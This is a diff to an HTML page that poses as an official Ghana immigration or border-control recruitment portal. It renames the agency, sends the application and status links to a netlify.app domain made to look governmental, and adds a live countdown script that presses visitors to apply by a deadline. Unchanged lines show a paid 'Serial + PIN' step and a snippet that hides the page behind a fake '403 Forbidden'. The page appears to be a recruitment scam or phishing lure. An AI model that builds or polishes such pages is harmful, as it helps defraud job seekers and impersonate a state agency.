@@ -116,12 +116,13 @@ input, select{padding:12px;border:1px solid var(--border);border-radius:8px;font
 </head>
 <body>
 
-<div class="security-bar">Official Government of Ghana | Ghana Immigration Service (GIS) |  | Secure Portal</div>
+<div class="security-bar">Official Border Control Ghana | Ghana Immigration Border Control (GIBC) |  | Secure Portal</div>
 
 <div class="timer-bar">
   <span class="urgent-dot"></span>
-  <span><strong>APPLICATION CLOSES:</strong> Wednesday 12:00 PM GMT • Nov/Dec 2026 Intake</span>
-  <span class="timer-box">01D : 18H : 42M : 11S — ENDS WED 12:00</span>
+   <span class="timer-box">01D : 18H : 42M : 11S — ENDS WED 12:00</span>
+ 
+  <span class="timer-box" id="live-timer">Loading...</span>
 </div>
 
 <header class="header">
@@ -136,8 +137,8 @@ input, select{padding:12px;border:1px solid var(--border);border-radius:8px;font
     <nav class="nav">
       <a href="#overview" class="active">Overview</a>
       <a href="#requirements">Requirements</a>
-      <a href="https://applicationcom.netlify.app/">Application</a>
-      <a href="https://applicationcom.netlify.app/">Status</a>
+      <a href="https://tobesubmittedforverificationgovgh.netlify.app/">Application</a>
+      <a href="https://tobesubmittedforverificationgovgh.netlify.app/">Status</a>
     </nav>
   </div>
 </header>
@@ -149,7 +150,7 @@ input, select{padding:12px;border:1px solid var(--border);border-radius:8px;font
       <h2>Serve. Secure. <span>Protect.</span></h2>
       <p class="hero-desc">Join Ghana's elite Border Control Force. This portal uses real GIS operational imagery. Secure Ghana's borders across 8 sectors with integrity and professionalism.</p>
       <div class="btn-row">
-        <a href="https://applicationcom.netlify.app/" class="btn btn-primary">Start Application →</a>
+        <a href="https://tobesubmittedforverificationgovgh.netlify.app/" class="btn btn-primary">Start Application →</a>
         <a href="#requirements" class="btn btn-ghost">Check Eligibility</a>
       </div>
       <div class="stats">
@@ -278,6 +279,46 @@ Receive 12-digit Serial + PIN</b>
     document.documentElement.innerHTML = '<h1>403 Forbidden</h1>';
     window.stop(); 
   }
+
+
+
+
+  // 1. Set your target deadline date and time
+  const targetDate = new Date("November 4, 2026 12:00:00").getTime();
+
+  function updateCountdown() {
+    const now = new Date().getTime();
+    const distance = targetDate - now;
+
+    const timerElement = document.getElementById("live-timer");
+
+    // If the countdown is finished
+    if (distance < 0) {
+      timerElement.innerHTML = "APPLICATION CLOSED";
+      clearInterval(timerInterval);
+      return;
+    }
+
+    // Calculate days, hours, minutes, and seconds
+    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+    const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+    // Format numbers to always have two digits (e.g., "05" instead of "5")
+    const d = String(days).padStart(2, '0');
+    const h = String(hours).padStart(2, '0');
+    const m = String(minutes).padStart(2, '0');
+    const s = String(seconds).padStart(2, '0');
+
+    // Display the result inside the timer box
+    timerElement.innerHTML = `${d}D : ${h}H : ${m}M : ${s}S`;
+  }
+
+  // Run the function immediately when the page loads, then every 1 second (1000ms)
+  updateCountdown();
+  const timerInterval = setInterval(updateCountdown, 1000);
+
 </script>
 
 
